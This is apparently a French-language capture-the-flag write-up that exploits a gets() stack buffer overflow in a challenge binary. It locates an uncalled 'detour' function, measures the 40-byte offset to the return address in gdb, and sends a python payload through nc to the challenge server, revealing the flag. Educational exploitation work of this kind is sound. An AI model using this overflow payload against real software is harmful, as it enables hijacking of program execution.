# Write up

La fonction `gets` est dépréciée car elle n'est pas sécuritaire, mais elle existe toujours. Dans la plupart des versions de son `manpage`, on retrouve la phrase "Never use this function.". Cette fonction vulnérable nous permet de dépasser le _buffer_ alloué pour notre nom afin de modifier l'adresse de retour de la fonction flux.

En analysant le programme, il y a plusieurs manière de trouver la fonction qu'on désire exécuter. On peut identifier la chaîne de caractères "FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" et trouver où elle est utilisée (ex: `xrefs` dans Ghidra). Si on désassemble simplement le programme avec `objdump`, on peut voir qu'il existe une fonction `detour`. C'est la seule fonction qui n'est pas appelée ce qui en fait une piste très intéressante pour nous; on note donc son adresse.

```
[...]
0000000000401156 <detour>:
  401156:       55                      push   rbp
  401157:       48 89 e5                mov    rbp,rsp
  40115a:       48 8d 35 a7 0e 00 00    lea    rsi,[rip+0xea7]        # 402008 <_IO_stdin_used+0x8>
  401161:       48 8d 3d c8 0e 00 00    lea    rdi,[rip+0xec8]        # 402030 <_IO_stdin_used+0x30>
  401168:       b8 00 00 00 00          mov    eax,0x0
  40116d:       e8 ce fe ff ff          call   401040 <printf@plt>
  401172:       90                      nop
  401173:       5d                      pop    rbp
  401174:       c3                      ret
[...]
```

Dans `gdb`, on peut observer que l'adresse de l'intruction suivant l'appel à `flux` est `0x401242`, on s'attend donc à retrouver cette celle-ci comme adresse de retour. On pourra utiliser cette valeur connue pour identifier son emplacement dans la _stack_.

```
0x40123d <main+110>       call   0x401175 <flux>
0x401242 <main+115>       mov    eax, 0x0
```

On peut ensuite coir l'état de la pile pour comment écraser l'adresse de retour. Dans l'exemple suivant, j'ai entré "TESTESTEST" comme nom. Voici la _stack_ près l'appel à `gets`:

```
gef➤  x/12wx $rsp
0x7fffffffd9d0: 0x54534554      0x45545345      0xff005453      0x00007fff
0x7fffffffd9e0: 0x00401070      0x00c700a4      0x73756f77      0x00686868
0x7fffffffd9f0: 0xffffda10      0x00007fff      0x00401242      0x00000000
             ^emplacement de $rbp
```

On peut voir que la valeur `0x00401242` se trouve 40 bytes après le début de notre buffer. Il faudra dont écrire 44 bytes et que les 4 derniers soient l'adresse de la fonction `detour` (`0x00401156`).

À partir de nos observations, on peut faire une représentation visuelle de la pile comme ceci:

```
                | 16 bytes                          |
                |  8 bytes        | 8 bytes         |
                |  4      | 4     | 4       | 4     |
                |  2 | 2  | 2 | 2 | 2  | 2  | 2 | 2 |
                |-----------------------------------|
                |-----------------------------------|
0x7fffffffd9d0  | son                               | //buffer qui enregistre notre son
                |-----------------------------------|
0x7fffffffd9e0  |0xc7|0xa4| pad | "woushhh"         |
                |-----------------------------------|
0x7fffffffd9f0  | ancien $rbp   |addr retour|       |
                ^$rbp
```

Nous avons maintenant toutes les informations nécessaires pour exploiter le programme et pouvons envoyer notre _payload_.

```
python2 -c 'print("A"*40 + "\x56\x11\x40\x00")' | nc unitedctf.ca 17001

ou bien

python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"\x56\x11\x40\x00" + b"\n")' | nc localhost 17001
```

Et on obtient le flag FLAG-RET2TEXT_4cc0mplished_j5fwyolcmPg !

